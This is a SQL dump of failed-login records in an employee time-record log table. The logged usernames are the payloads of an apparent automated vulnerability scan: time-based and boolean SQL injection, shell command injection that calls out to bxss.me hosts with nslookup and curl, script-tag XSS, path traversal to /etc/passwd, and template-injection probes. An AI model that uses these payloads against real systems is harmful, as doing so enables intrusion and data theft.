INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1190', '', '2023-05-08 03:45:10', '', 'Invalid username/password. Tried with: file:///etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1191', '', '2023-05-08 03:45:10', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1192', '', '2023-05-08 03:45:10', '', 'Invalid username/password. Tried with: RDFYjolf\'&&sleep(27*1000)*ghploh&&\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1193', '', '2023-05-08 03:45:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1194', '', '2023-05-08 03:45:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1195', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1196', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: RDFYjolf\"&&sleep(27*1000)*iaapfe&&\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1197', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1198', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: ../RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1199', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: RDFYjolf\'||sleep(27*1000)*trwjoa||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1200', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: echo dixsql$()\\ mpghsa\\nz^xyu||a #\' &echo dixsql$()\\ mpghsa\\nz^xyu||a #|\" &echo dixsql$()\\ mpghsa\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1201', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1202', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1203', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: RDFYjolf\"||sleep(27*1000)*cobgxp||\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1204', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: &echo hwilxw$()\\ etutmm\\nz^xyu||a #\' &echo hwilxw$()\\ etutmm\\nz^xyu||a #|\" &echo hwilxw$()\\ etutmm\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1205', '', '2023-05-08 03:45:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1206', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1207', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: |echo kfaycq$()\\ pqjhgm\\nz^xyu||a #\' |echo kfaycq$()\\ pqjhgm\\nz^xyu||a #|\" |echo kfaycq$()\\ pqjhgm\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1208', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1209', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1210', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: (nslookup -q=cname hitsgkckvdhcqdb198.bxss.me||curl hitsgkckvdhcqdb198.bxss.me))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1211', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1212', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1213', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: xfs.bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1214', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1215', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: $(nslookup -q=cname hitirrwepnhrb78474.bxss.me||curl hitirrwepnhrb78474.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1216', '', '2023-05-08 03:45:12', '', 'Invalid username/password. Tried with: RDFYjolf\'\"()&%<zzz><ScRiPt >I2pa(9072)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1217', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1218', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1219', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: &nslookup -q=cname hitegozgtkiuh3f5e2.bxss.me&\'\\\"`0&nslookup -q=cname hitegozgtkiuh3f5e2.bxss.me&`\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1220', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: \'\"()&%<zzz><ScRiPt >I2pa(9447)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1221', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1222', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1223', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: &(nslookup -q=cname hitrjtuwieqrs25f52.bxss.me||curl hitrjtuwieqrs25f52.bxss.me)&\'\\\"`0&(nslookup -q=cname hitrj', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1224', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: RDFYjolf9943504', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1225', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: \'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1226', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1227', '', '2023-05-08 03:45:13', '', 'Invalid username/password. Tried with: |(nslookup -q=cname hitwnunhcpzybe857d.bxss.me||curl hitwnunhcpzybe857d.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1228', '', '2023-05-08 03:45:14', '', 'Invalid username/password. Tried with: <!--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1229', '', '2023-05-08 03:45:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1230', '', '2023-05-08 03:45:14', '', 'Invalid username/password. Tried with: `(nslookup -q=cname hitpohxkrfckv6e152.bxss.me||curl hitpohxkrfckv6e152.bxss.me)`', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1231', '', '2023-05-08 03:45:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1232', '', '2023-05-08 03:45:14', '', 'Invalid username/password. Tried with: ;(nslookup -q=cname hitvlvewahkgm920e3.bxss.me||curl hitvlvewahkgm920e3.bxss.me)|(nslookup -q=cname hitvlvewahk', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1233', '', '2023-05-08 03:45:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1234', '', '2023-05-08 03:45:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1235', '', '2023-05-08 03:45:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1236', '', '2023-05-08 03:45:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1237', '', '2023-05-08 03:45:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1238', '', '2023-05-08 03:45:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1239', '', '2023-05-08 03:45:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1240', '', '2023-05-08 03:45:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1241', '', '2023-05-08 03:45:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1242', '', '2023-05-08 03:45:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1243', '', '2023-05-08 03:45:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1244', '', '2023-05-08 03:45:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1245', '', '2023-05-08 03:45:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1246', '', '2023-05-08 03:45:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1247', '', '2023-05-08 03:45:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1248', '', '2023-05-08 03:45:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1249', '', '2023-05-08 03:45:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1250', '', '2023-05-08 03:45:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1251', '', '2023-05-08 03:45:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1252', '', '2023-05-08 03:45:24', '', 'Invalid username/password. Tried with: K0W0bDvy', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1253', '', '2023-05-08 03:45:24', '', 'Invalid username/password. Tried with: -1 OR 2+666-666-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1254', '', '2023-05-08 03:45:25', '', 'Invalid username/password. Tried with: -1 OR 2+941-941-1=0+0+0+1', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1255', '', '2023-05-08 03:45:25', '', 'Invalid username/password. Tried with: -1\' OR 2+143-143-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1256', '', '2023-05-08 03:45:25', '', 'Invalid username/password. Tried with: -1\' OR 2+614-614-1=0+0+0+1 or \'mB45K5Xl\'=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1257', '', '2023-05-08 03:45:25', '', 'Invalid username/password. Tried with: -1\" OR 2+715-715-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1258', '', '2023-05-08 03:45:27', '', 'Invalid username/password. Tried with: if(now()=sysdate(),sleep(15),0)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1259', '', '2023-05-08 03:45:28', '', 'Invalid username/password. Tried with: 0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1260', '', '2023-05-08 03:45:30', '', 'Invalid username/password. Tried with: 0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1261', '', '2023-05-08 03:45:33', '', 'Invalid username/password. Tried with: (select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1262', '', '2023-05-08 03:45:34', '', 'Invalid username/password. Tried with: 1 waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1263', '', '2023-05-08 03:45:36', '', 'Invalid username/password. Tried with: JTMtddtH\'; waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1264', '', '2023-05-08 03:45:38', '', 'Invalid username/password. Tried with: b5Tut5Hs\' OR 258=(SELECT 258 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1265', '', '2023-05-08 03:45:40', '', 'Invalid username/password. Tried with: kgquUYe6\') OR 758=(SELECT 758 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1266', '', '2023-05-08 03:45:41', '', 'Invalid username/password. Tried with: VdzTrIeT\')) OR 574=(SELECT 574 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1267', '', '2023-05-08 03:45:44', '', 'Invalid username/password. Tried with: RDFYjolf\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1268', '', '2023-05-08 03:45:44', '', 'Invalid username/password. Tried with: 1\'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1269', '', '2023-05-08 03:45:44', '', 'Invalid username/password. Tried with: 1%2527%2522', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1270', '', '2023-05-08 03:45:44', '', 'Invalid username/password. Tried with: @@dMV67', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1271', '', '2023-05-08 03:45:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1272', '', '2023-05-08 03:45:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1273', '', '2023-05-08 03:45:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1274', '', '2023-05-08 03:45:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1275', '', '2023-05-08 03:45:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1276', '', '2023-05-08 03:45:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1277', '', '2023-05-08 03:45:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1278', '', '2023-05-08 03:45:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1279', '', '2023-05-08 03:45:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1280', '', '2023-05-08 03:45:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1281', '', '2023-05-08 03:45:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1282', '', '2023-05-08 03:45:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1283', '', '2023-05-08 03:46:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1284', '', '2023-05-08 03:46:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1285', '', '2023-05-08 03:46:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1286', '', '2023-05-08 03:46:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1287', '', '2023-05-08 03:46:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1288', '', '2023-05-08 03:46:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1289', '', '2023-05-08 03:46:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1290', '', '2023-05-08 03:46:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1291', '', '2023-05-08 03:46:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1292', '', '2023-05-08 03:49:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1293', '', '2023-05-08 03:50:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1294', '', '2023-05-08 03:50:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1295', '', '2023-05-08 03:50:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1296', '', '2023-05-08 03:50:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1297', '', '2023-05-08 03:50:15', '', 'Invalid username/password. Tried with: ${10000061+9999189}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1298', '', '2023-05-08 03:50:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1299', '', '2023-05-08 03:50:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1300', '', '2023-05-08 03:50:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1301', '', '2023-05-08 03:50:15', '', 'Invalid username/password. Tried with: response.write(9350072*9767213)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1302', '', '2023-05-08 03:50:16', '', 'Invalid username/password. Tried with: Z3RxTmw1d3M=', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1303', '', '2023-05-08 03:50:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1304', '', '2023-05-08 03:50:16', '', 'Invalid username/password. Tried with: \'+response.write(9350072*9767213)+\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1305', '', '2023-05-08 03:50:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1306', '', '2023-05-08 03:50:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1307', '', '2023-05-08 03:50:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
